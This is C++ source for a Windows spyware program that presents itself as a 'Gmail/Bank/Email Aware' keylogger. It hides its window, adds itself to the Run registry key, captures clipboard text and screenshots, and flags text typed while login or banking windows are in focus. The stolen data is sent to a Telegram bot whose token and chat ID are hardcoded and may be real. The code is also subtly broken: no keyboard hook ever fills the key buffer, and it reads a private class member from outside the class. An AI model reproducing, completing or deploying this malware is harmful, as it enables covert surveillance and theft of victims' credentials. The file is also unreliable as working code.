#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <regex>
#include <sstream>
#include <shlobj.h>
#include <tlhelp32.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";

std::wstring keyBuffer, clipBuffer;
std::vector<BYTE> screenshotBuffer;
CRITICAL_SECTION keyLock, clipLock;
HANDLE hHttpSession = NULL;
bool running = true;
FILETIME lastScreenshot = {0};
std::wstring activeWindowTitle;

class ContextAwareDetector {
private:
    std::wstring currentContext;
    
public:
    void update_context() {
        HWND foreground = GetForegroundWindow();
        if (foreground) {
            wchar_t title[256];
            GetWindowTextW(foreground, title, 256);
            activeWindowTitle = title;
            
            // Detect login pages
            if (wcsstr(title, L"gmail") || wcsstr(title, L"Google")) {
                currentContext = L"GMAIL";
            } else if (wcsstr(title, L"outlook") || wcsstr(title, L"live.com")) {
                currentContext = L"OUTLOOK";
            } else if (wcsstr(title, L"facebook") || wcsstr(title, L"login")) {
                currentContext = L"FACEBOOK";
            } else if (wcsstr(title, L"bank") || wcsstr(title, L"chase") || wcsstr(title, L"wells")) {
                currentContext = L"BANK";
            } else {
                currentContext = L"GENERAL";
            }
        }
    }
    
    std::wstring detect_credentials(const std::wstring& text) {
        update_context();
        
        std::wstring email = detect_email(text);
        std::wstring pass = detect_password(text);
        
        if (!email.empty() && !pass.empty()) {
            return L"[" + currentContext + L"-LOGIN: " + email + L"] [" + 
                   currentContext + L"-PASS: " + pass + L"]";
        } else if (!email.empty()) {
            return L"[" + currentContext + L": " + email + L"]";
        } else if (!pass.empty()) {
            return L"[" + currentContext + L"-PASS: " + pass + L"]";
        }
        return L"";
    }
    
private:
    std::wstring detect_email(const std::wstring& text) {
        // Full email
        std::wregex email_regex(L"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,})");
        std::wsmatch match;
        if (std::regex_search(text, match, email_regex)) {
            return match[1].str();
        }
        
        // Username pattern (6-25 chars + enter/tab)
        std::wregex user_regex(L"([a-zA-Z0-9._]{6,25})(?=[\\r\\n\\t ]|$)");
        if (std::regex_search(text, match, user_regex)) {
            std::wstring user = match[1].str();
            if (currentContext == L"GMAIL" || wcsstr(activeWindowTitle.c_str(), L"mail")) {
                return user + L"@gmail.com";
            }
            return user;
        }
        return L"";
    }
    
    std::wstring detect_password(const std::wstring& text) {
        // 8+ sequential chars (password pattern)
        std::wregex pass_regex(L"([a-zA-Z0-9!@#$%^&*._-]{8,})(?=[\\r\\n\\t ]|$)");
        std::wsmatch match;
        if (std::regex_search(text, match, pass_regex)) {
            std::wstring pass = match[1].str();
            std::wstring masked;
            for (size_t i = 0; i < pass.length(); ++i) masked += L'*';
            return masked + L"(" + std::to_wstring(pass.length()) + L")";
        }
        return L"";
    }
};

ContextAwareDetector detector;

std::string url_encode(const std::string& input) {
    std::string result;
    for (unsigned char c : input) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            result += c;
        } else {
            char buf[4];
            sprintf_s(buf, "%%%02X", c);
            result += buf;
        }
    }
    return result;
}

std::string wstring_to_utf8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

bool init_winhttp() {
    hHttpSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    return hHttpSession != NULL;
}

void send_telegram(const std::wstring& message) {
    if (!hHttpSession || message.empty()) return;
    
    std::string utf8_msg = wstring_to_utf8(message);
    if (utf8_msg.size() > 3900) utf8_msg = utf8_msg.substr(0, 3900);
    
    std::string encoded_msg = url_encode(utf8_msg);
    std::string path = "/bot" + wstring_to_utf8(std::wstring(BOT_TOKEN)) +
                      "/sendMessage?chat_id=" + wstring_to_utf8(std::wstring(CHAT_ID)) +
                      "&text=" + encoded_msg;
    std::wstring wpath(path.begin(), path.end());
    
    HINTERNET hConnect = WinHttpConnect(hHttpSession, L"api.telegram.org", 
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return;
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(), NULL,
                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           WINHTTP_FLAG_SECURE);
    if (hRequest) {
        WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        WinHttpReceiveResponse(hRequest, NULL);
        WinHttpCloseHandle(hRequest);
    }
    WinHttpCloseHandle(hConnect);
    Sleep(300);
}

void process_keys() {
    if (!TryEnterCriticalSection(&keyLock)) return;
    if (keyBuffer.empty()) {
        LeaveCriticalSection(&keyLock);
        return;
    }
    
    std::wstring data = keyBuffer;
    keyBuffer.clear();
    LeaveCriticalSection(&keyLock);
    
    // CONTEXT-AWARE DETECTION
    std::wstring creds = detector.detect_credentials(data);
    if (!creds.empty()) {
        send_telegram(creds + L"\nWINDOW: " + activeWindowTitle + L"\nKEYS: " + data);
    } else if (data.length() > 12) {
        send_telegram(L"[" + detector.currentContext + L"] " + data);
    }
}

std::wstring get_clipboard() {
    if (!IsClipboardFormatAvailable(CF_UNICODETEXT) || !OpenClipboard(NULL)) 
        return L"";
    
    HGLOBAL hglb = GetClipboardData(CF_UNICODETEXT);
    if (hglb) {
        wchar_t* clipText = (wchar_t*)GlobalLock(hglb);
        std::wstring result(clipText);
        GlobalUnlock(hglb);
        CloseClipboard();
        return result;
    }
    CloseClipboard();
    return L"";
}

void clipboard_monitor() {
    std::wstring lastClip;
    while (running) {
        std::wstring clip = get_clipboard();
        if (!clip.empty() && clip != lastClip && clip.length() > 2) {
            if (TryEnterCriticalSection(&clipLock)) {
                clipBuffer = L"[CLIPBOARD] " + clip.substr(0, 150);
                LeaveCriticalSection(&clipLock);
                lastClip = clip;
            }
        }
        Sleep(1500);
    }
}

void capture_screenshot() {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    int cx = GetSystemMetrics(SM_CXSCREEN) / 2;
    int cy = GetSystemMetrics(SM_CYSCREEN) / 2;
    
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, cx, cy);
    SelectObject(hdcMem, hbm);
    BitBlt(hdcMem, 0, 0, cx, cy, hdcScreen, 0, 0, SRCCOPY);
    
    BITMAPINFOHEADER bi = {sizeof(BITMAPINFOHEADER), cx, -cy, 1, 24, BI_RGB};
    screenshotBuffer.resize((cx * cy * 3) + 54);
    
    // BMP headers
    DWORD* pdw = (DWORD*)screenshotBuffer.data();
    pdw[0] = 0x4D42; // 'BM'
    pdw[1] = screenshotBuffer.size();
    pdw[2] = 0;
    pdw[3] = 54;
    memcpy(screenshotBuffer.data() + 14, &bi, sizeof(bi));
    
    GetDIBits(hdcMem, hbm, 0, cy, screenshotBuffer.data() + 54, 
              (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    DeleteObject(hbm);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void send_screenshot() {
    if (screenshotBuffer.empty()) return;
    
    HINTERNET hConnect = WinHttpConnect(hHttpSession, L"api.telegram.org",
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return;
    
    std::string path = "/bot" + wstring_to_utf8(std::wstring(BOT_TOKEN)) +
                      "/sendPhoto?chat_id=" + wstring_to_utf8(std::wstring(CHAT_ID));
    std::wstring wpath(path.begin(), path.end());
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wpath.c_str(), NULL,
                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           WINHTTP_FLAG_SECURE);
    if (hRequest) {
        std::string boundary = "----ChangesBoundary123";
        std::string content_type = "Content-Type: multipart/form-data; boundary=" + boundary;
        
        std::string body = "--" + boundary + "\r\n" +
                          "Content-Disposition: form-data; name=\"photo\"; filename=\"screen.bmp\"\r\n" +
                          "Content-Type: image/bmp\r\n\r\n";
        body.append(screenshotBuffer.begin(), screenshotBuffer.end());
        body += "\r\n--" + boundary + "--\r\n";
        
        WinHttpSendRequest(hRequest, content_type.c_str(), content_type.length(),
                          (LPVOID)body.data(), body.length(), body.length(), 0);
        WinHttpReceiveResponse(hRequest, NULL);
        WinHttpCloseHandle(hRequest);
    }
    WinHttpCloseHandle(hConnect);
    screenshotBuffer.clear();
}

void persistence() {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER,
                               L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                               0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        RegSetValueExW(hKey, L"Changes", 0, REG_SZ,
                      (BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

void stealth_init() {
    FreeConsole();
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
}

int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
    DisableThreadLibraryCalls(GetModuleHandle(NULL));
    CoInitialize(NULL);
    
    InitializeCriticalSection(&keyLock);
    InitializeCriticalSection(&clipLock);
    
    stealth_init();
    persistence();
    
    if (init_winhttp()) {
        send_telegram(L"[Changes] ACTIVATED - Gmail/Bank/Email Aware Keylogger");
        
        std::thread clipboard_thread(clipboard_monitor);
        clipboard_thread.detach();
        
        SYSTEMTIME st;
        while (running) {
            // Process keys
            process_keys();
            
            // Clipboard
            if (TryEnterCriticalSection(&clipLock) && !clipBuffer.empty()) {
                send_telegram(clipBuffer);
                clipBuffer.clear();
                LeaveCriticalSection(&clipLock);
            }
            
            // Screenshot every 45s
            GetSystemTime(&st);
            FILETIME now;
            SystemTimeToFileTime(&st, &now);
            ULARGE_INTEGER nowUL = {now.dwLowDateTime, now.dwHighDateTime};
            ULARGE_INTEGER lastUL = {lastScreenshot.dwLowDateTime, lastScreenshot.dwHighDateTime};
            
            if ((nowUL.QuadPart - lastUL.QuadPart) > 450000000LL) {
                capture_screenshot();
                send_screenshot();
                send_telegram(L"[SCREENSHOT] " + activeWindowTitle);
                lastScreenshot = now;
            }
            
            Sleep(75); // 75ms polling
        }
    }
    
    running = false;
    Sleep(1000);
    DeleteCriticalSection(&clipLock);
    DeleteCriticalSection(&keyLock);
    if (hHttpSession) WinHttpCloseHandle(hHttpSession);
    CoUninitialize();
    return 0;
}
